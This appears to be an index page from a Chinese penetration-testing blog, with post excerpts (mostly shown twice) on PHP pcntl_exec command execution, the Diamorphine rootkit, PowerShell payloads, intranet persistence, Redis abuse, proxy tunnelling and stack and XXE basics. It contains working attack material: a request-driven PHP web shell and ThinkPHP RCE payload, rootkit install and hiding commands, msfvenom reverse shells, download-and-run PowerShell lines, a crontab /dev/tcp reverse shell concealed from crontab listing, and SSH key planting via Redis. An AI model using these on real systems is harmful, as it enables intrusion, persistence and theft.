if($pid &#x3D;&#x3D; -1)&#123;
    die(&#39;could not fork&#39;);
&#125;else&#123;
    if($pid)&#123;
        $status &#x3D; 0;
        pcntl_exec($cmd[0], $cmd[1]);
        posix_kill(getmypid(),9);
&#x2F;&#x2F;阻塞父进程，直到子进程结束，不适合需要长时间运行的脚本.
        &#x2F;&#x2F;可使用pcntl_wait($status, WNOHANG)实现非阻塞式

        pcntl_wait($status);
        exit;
    &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>cmd[0]=/bin/bash&amp;cmd[1][0]=-c&amp;cmd[1][1]=ping%20baidu.com%20%26%26%20pkill%20php-fpm</code></p>
<p><strong>执行命令的时候不要阻塞，不要阻塞,不要阻塞(举个例子，ping baidu.com就很蠢了)</strong></p>
<hr>
<pre class="line-numbers language-none"><code class="language-none">参数执行:
pcntl_exec(&quot;&#x2F;bin&#x2F;bash&quot;,array(&quot;-c&quot;,&quot;id &gt; 1.txt&quot;)) &#x2F;&#x2F;返回值可能是502

执行脚本:
pcntl_exec(&quot;&#x2F;tmp&#x2F;script&quot;)   &#x2F;&#x2F;返回值502<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">返回值200
&lt;?php
$cmd &#x3D; $_REQUEST[&#39;cmd&#39;];
if(function_exists(&#39;pcntl_exec&#39;)) &#123;
    switch(pcntl_fork())&#123;
     case 0:
        pcntl_exec($cmd[0], $cmd[1]);
    default:
          echo &quot;case 111&quot;;
    &#125;
&#125; else &#123;
        echo &#39;不支持pcntl扩展&#39;;
&#125;
?&gt;


cmd[0]&#x3D;&#x2F;bin&#x2F;bash&amp;cmd[1][0]&#x3D;-c&amp;cmd[1][1]&#x3D;id &gt; &#x2F;tmp&#x2F;xxx.txt

&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;pcntl_exec&amp;vars[1][0]&#x3D;&#x2F;bin&#x2F;bash&amp;vars[1][1][0]&#x3D;&#x2F;tmp&#x2F;1.sh
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<pre class="line-numbers language-none"><code class="language-none">
&lt;?php
header(&quot;Content-Type: text&#x2F;plain&quot;);
$cmd&#x3D;&quot;&#x2F;tmp&#x2F;exec&quot;;
@unlink($cmd);
@unlink(&quot;&#x2F;tmp&#x2F;output&quot;);
$c &#x3D; &quot;#!&#x2F;usr&#x2F;bin&#x2F;env bash\nuname -a &gt; &#x2F;tmp&#x2F;output\n&quot;;
file_put_contents($cmd, $c);
chmod($cmd, 0777);

switch (pcntl_fork()) &#123;
  case 0:
    $ret &#x3D; pcntl_exec($cmd);
    exit(&quot;case 0&quot;);
  default:
    echo &quot;case 1&quot;;
    break;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>上面执行的脚本那行chmod不可以少</p>
	
	</div>
  <a type="button" href="/2018/12/18/pcntl_exec.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/07/18/lkm-rootkit.html" >LKM Rootkit</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-07-18  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p>
<p>编译安装:</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
cd Diamorphine
make
insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p>
<pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块
rmmod diamorphine   删除rootkit
kill -64 0  从任意用户切换到root用户
kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/m0nad/Diamorphine">https://github.com/m0nad/Diamorphine</a>,支持内核2.6.x/3.x/4.x</p>
<p>编译安装:</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;m0nad&#x2F;Diamorphine
cd Diamorphine
make
insmod diamorphine.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>在<code>diamorphine.h</code>里面定义了<code>MAGIC_PREFIX</code>, 可以自己修改为任意其他东西，比如<code>xx</code>，然后以xx为开头的文件就回全部隐身啦</p>
<pre class="line-numbers language-none"><code class="language-none">kill -63 0  隐藏(显示) rootkit模块
rmmod diamorphine   删除rootkit
kill -64 0  从任意用户切换到root用户
kill -31 &lt;pid&gt; 隐藏&lt;pid&gt;的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2018/07/18/lkm-rootkit.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/07/05/stack.html" >栈溢出学习笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-07-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p>
<ol>
<li>代码区：可执行指令</li>
<li>数据区：用于存储全局变量</li>
<li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li>
<li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li>
</ol>
<p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p>
<p>内存中的栈区指的就是系统栈，由系统自动维护。</p>
<p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p>
<ul>
<li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li>
<li>%ebp 指向栈的底部</li>
<li>%eip 用来存储即将执行的程序指令的地址</li>
<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
</ul>
<p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p>
<ul>
<li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li>
<li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li>
<li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li>
<li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li>
</ul>
<p>栈操作（在32位下)：</p>
<ul>
<li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li>
<li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li>
</ul>
	

	</div>
  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>根据不同的操作系统，一个进程可能被分配到不同内存区域中执行，但是不管什么样的系统，什么样的计算机结构，进程使用的内存可以按照功能分为4个部分：</p>
<ol>
<li>代码区：可执行指令</li>
<li>数据区：用于存储全局变量</li>
<li>堆区：进程可以在堆区动态的请求一定大小内存，并在用完之后归还给堆区。动态分布和回收是堆区的特点</li>
<li>栈区：用于动态的存储函数之间的调用关系，以保证被调用函数返回时恢复到母函数中继续执行</li>
</ol>
<p>程序中使用的缓冲区可以在堆区、栈区、数据区，不同地方的缓冲区利用方式不同。</p>
<p>内存中的栈区指的就是系统栈，由系统自动维护。</p>
<p>栈时FILO结构，所以栈顶指的是最下方，底部是最上方。</p>
<ul>
<li>%esp 指向栈的顶部（栈指针寄存器，存放一个指针，永远指向系统栈最上面栈帧的栈顶)</li>
<li>%ebp 指向栈的底部</li>
<li>%eip 用来存储即将执行的程序指令的地址</li>
<li>Frame Pointer(FP) Or Base Pointer(BP), Stack Pointer(SP)</li>
<li>函数栈帧：ESP和EBP之间内存空间为当前栈帧</li>
</ul>
<p>32位x86架构下的通用寄存器包括一般寄存器（eax、ebx、ecx、edx），索引寄存器（esi、edi)，以及堆栈指针寄存器(esp,ebp)</p>
<ul>
<li>eax: 累加寄存器(Accumulator),用以进行算数运算和返回函数结果等。</li>
<li>ebx: 被称为基址寄存器（Base），在内存寻址的时候用来存放基地址。</li>
<li>exc: 被称为计数寄存器(Counter)，用以在循环中计数。</li>
<li>edx: 被称为数据寄存器(Data)，常配合eax一起存放运算结果等数据。</li>
</ul>
<p>栈操作（在32位下)：</p>
<ul>
<li>push（压栈） push sth -&gt; [esp]=sth, esp=esp-4</li>
<li>pop （出栈） pop sth -&gt; sth=[esp], esp=esp+4</li>
</ul>
	
	</div>
  <a type="button" href="/2018/07/05/stack.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/06/13/powershell-pen.html" >Powershell</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-06-13  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;


端口扫描:
powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;

自定义端口和IP
1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;


1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;



powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx

内存加载运行:
powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 


下载文件:
(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
</ul>
<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt

#&#x2F;usr&#x2F;bin&#x2F;env python
# coding:utf-8

import base64
import gzip
import StringIO
import sys

f &#x3D; sys.argv[1]
with open(f, &quot;rb&quot;) as file:
    data &#x3D; file.read()

decoded&#x3D;base64.b64decode(data)
res &#x3D; StringIO.StringIO(decoded)
for i in gzip.GzipFile(fileobj&#x3D;res):
    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-none"><code class="language-none">反弹123端口的powershell
msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;x.x.x. LPORT&#x3D;123 -f psh-reflection &gt;123.ps1
powershell.exe -exec Bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;x.x.x.x&#x2F;123.ps1&#39;)&quot;


端口扫描:
powershell -exec bypass -c &quot;444..446 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;x.x.x.x&#39;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&quot;

自定义端口和IP
1..20 | % &#123; $a &#x3D; $_; 1..1024 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;192.168.1.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;


1..20 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;192.168.1.$a&quot;; 22,53,80,445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;
169..171 | % &#123; $a &#x3D; $_; write-host &quot;------&quot;; write-host &quot;103.27.177.$a&quot;; 445 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&quot;10.0.0.$a&quot;,$_)) &quot;Port $_ is open!&quot;&#125; 2&gt;$null&#125;



powershell.exe -exec Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -enc xxx

内存加载运行:
powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;clymb3r&#x2F;PowerShell&#x2F;master&#x2F;Invoke-ReflectivePEInjection&#x2F;Invoke-ReflectivePEInjection.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http:&#x2F;&#x2F;x.x.x.x&#x2F;2.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot; 


下载文件:
(New-Object System.Net.Webclient).DownloadFile(&quot;http:&#x2F;&#x2F;x.x.x.x&#x2F;k.aspx&quot;,&quot;&quot;)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li><a target="_blank" rel="noopener" href="http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/">http://rcoil.me/2017/04/PowerShell%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</a></li>
</ul>
<p>在使用msf生成ps的payload的时候，对于生成的文件格式是hta-psh解码顺序是这样的，对于其中的base64编码，先正常的base64解码，然后提取解码之后中的base64，保存为1.txt，使用如下脚本解码:</p>
<pre class="line-numbers language-none"><code class="language-none">python decode.py 1.txt

#&#x2F;usr&#x2F;bin&#x2F;env python
# coding:utf-8

import base64
import gzip
import StringIO
import sys

f &#x3D; sys.argv[1]
with open(f, &quot;rb&quot;) as file:
    data &#x3D; file.read()

decoded&#x3D;base64.b64decode(data)
res &#x3D; StringIO.StringIO(decoded)
for i in gzip.GzipFile(fileobj&#x3D;res):
    print i<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2018/06/13/powershell-pen.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/06/05/local-network-pentest.html" >内网渗透注意事项</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-06-05  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p>
<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p>
<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redis
config get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdb
config set dir &#x2F;root&#x2F;.ssh
config set dbfilename &quot;authorized_keys&quot;
set xx &quot;\n\n pub_key\n\n&quot;
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p>
<p>redis查看部分key: </p>
<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h3 id="内网定时反弹"><a href="#内网定时反弹" class="headerlink" title="内网定时反弹:"></a>内网定时反弹:</h3><pre class="line-numbers language-none"><code class="language-none">(crontab -l;printf &quot;* * * * * exec 9&lt;&gt; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;xx;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;&#x2F;bin&#x2F;bash --noprofile -i;\rno crontab for &#96;whoami&#96;%100c\n&quot;)|crontab -<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>上面反弹之后，在centos下面，如果没有监听shell的情况下，终端一直会有<code>you have an email in /var/spool/root</code>, 解决方法如下:</p>
<pre class="line-numbers language-none"><code class="language-none">echo &quot;unset MAILCHECK&quot; &gt;&gt; ~&#x2F;.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="Redis写私钥"><a href="#Redis写私钥" class="headerlink" title="Redis写私钥"></a>Redis写私钥</h3><p>常规操作:</p>
<pre class="line-numbers language-none"><code class="language-none">config get dir  &#x2F;&#x2F;获取当前的目录, 默认: &#x2F;usr&#x2F;local&#x2F;redis
config get dbfilename &#x2F;&#x2F; 获取当前名字 默认: dump.rdb
config set dir &#x2F;root&#x2F;.ssh
config set dbfilename &quot;authorized_keys&quot;
set xx &quot;\n\n pub_key\n\n&quot;
save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>之后拿到shell，然后再把dir和dbfilename改回来，顺便把known_hosts给删除掉。</p>
<p>redis查看部分key: </p>
<pre class="line-numbers language-none"><code class="language-none">scan 1000 MATCH * COUNT 1000
get [key]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2018/06/05/local-network-pentest.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/03/02/openresty-https.html" >如何截取openresty反向代理服务器数据包</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-03-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。</p>
<h3 id="攻击背景"><a href="#攻击背景" class="headerlink" title="攻击背景"></a>攻击背景</h3><ul>
<li>获取https反向代理服务器的数据请求数据 </li>
<li>Windows平台</li>
</ul>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>下载openresty和nginx的windows版本，先本地测试一下。</p>
<p>如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。</p>
<p>把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe。</p>
<p>把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty，可以修改openresty源代码。</p>
<h3 id="截取POST数据包"><a href="#截取POST数据包" class="headerlink" title="截取POST数据包"></a>截取POST数据包</h3><p>根据P神的文章里面:</p>
	

	</div>
  <a type="button" href="/2018/03/02/openresty-https.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>有一天小明日了一台windows版本nginx的https的反向的代理服务器（这语句不通顺）。。</p>
<h3 id="攻击背景"><a href="#攻击背景" class="headerlink" title="攻击背景"></a>攻击背景</h3><ul>
<li>获取https反向代理服务器的数据请求数据 </li>
<li>Windows平台</li>
</ul>
<h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>下载openresty和nginx的windows版本，先本地测试一下。</p>
<p>如果直接复制openresty里面的nginx.exe到原汁原味nginx解压包里面，提示缺少dll，没毛病。</p>
<p>把openresty里面的nginx.exe libgcc_s_dw2-1.dll lua51.dll，一起复制到纯天然版本nginx的文件夹里面，启动nginx.exe。</p>
<p>把本地环境搬到目标服务器测试下，没毛病，目标网站的反代正常工作，唯一不正常的就是http的response的header变成了openresty，可以修改openresty源代码。</p>
<h3 id="截取POST数据包"><a href="#截取POST数据包" class="headerlink" title="截取POST数据包"></a>截取POST数据包</h3><p>根据P神的文章里面:</p>
	
	</div>
  <a type="button" href="/2018/03/02/openresty-https.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/02/03/termite-socks.html" >Termite代理工具</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-02-03  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
<p>正向socks v5服务器</p>
<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
<p>如果目标有一个外网IP：</p>
<p>ew来说建立socks代理服务：</p>
<p><code>ew -s ssocksd -l 8888</code></p>
<p>Termite:</p>
<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
admin_exe -c [tartet_ip] -p 8888
然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
goto 1
socks 1080
此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
	

	</div>
  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>网上讲ew的方法比较多，周末看了下作者的视频，感觉termite也挺有意思的</p>
<p>正向socks v5服务器</p>
<p><a target="_blank" rel="noopener" href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a><br>以上面这个文章作为例子，来说下对应的转发与代理</p>
<p>如果目标有一个外网IP：</p>
<p>ew来说建立socks代理服务：</p>
<p><code>ew -s ssocksd -l 8888</code></p>
<p>Termite:</p>
<pre class="line-numbers language-none"><code class="language-none">agent_exe -l 8888
admin_exe -c [tartet_ip] -p 8888
然后在admin_exe里面有一个操作界面，可以使用show看下当前节点分布，然后如下操作：
goto 1
socks 1080
此时VPS上面的1080就架设了一个服务器。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="反弹socks服务器"><a href="#反弹socks服务器" class="headerlink" title="反弹socks服务器"></a>反弹socks服务器</h2><p>假设目标机器没有公网IP，但是可以访问内网资源，ew的步骤是这样的：</p>
	
	</div>
  <a type="button" href="/2018/02/03/termite-socks.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2018/02/02/xxe.html" >XXE学习笔记</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2018-02-02  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>XML基础：</p>
<p>XML文档结构：</p>
<pre class="line-numbers language-none"><code class="language-none">XML声明
&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;

DTD文档类型定义
&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;
&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;
&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;
&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;
]]]


文档元素
&lt;note&gt;
&lt;to&gt;Dave&lt;&#x2F;to&gt;
&lt;from&gt;Tom&lt;&#x2F;from&gt;
&lt;head&gt;Reminder&lt;&#x2F;head&gt;
&lt;body&gt;You are a good man&lt;&#x2F;body&gt;
&lt;&#x2F;note&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTD(document type definitions)可以定义一个合法的XML文档构建模块，可以被成行声明于XML文档中，也可以作为一个外部引用。</p>
<pre class="line-numbers language-none"><code class="language-none">内部声明DTD：

&lt;!DOCTYPE 跟元素 [元素声明］&gt;

引用外部DTD:

&lt;!DOCTYPE 根元素  SYSTEM &quot;文件名&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>DTD文档中很多关键字如下: </p>
<ul>
<li>DOCTYPE(DTD的声明）</li>
<li>ENTITY （实体的声明）</li>
<li>SYSTEM、PUBLIC （外部资源申请） </li>
</ul>
<p>###实体</p>
<p>实体可以理解为变量，必须在DTD定义声明，可以在文档中的其它位置引用该变量的值。<br>实体按类型主要分以下四种:</p>
<ul>
<li>内置实体（Built-in entities)</li>
<li>字符实体（Character entities)</li>
<li>通用实体（General entities）</li>
<li>参数实体 (Parameter entities）</li>
</ul>
	

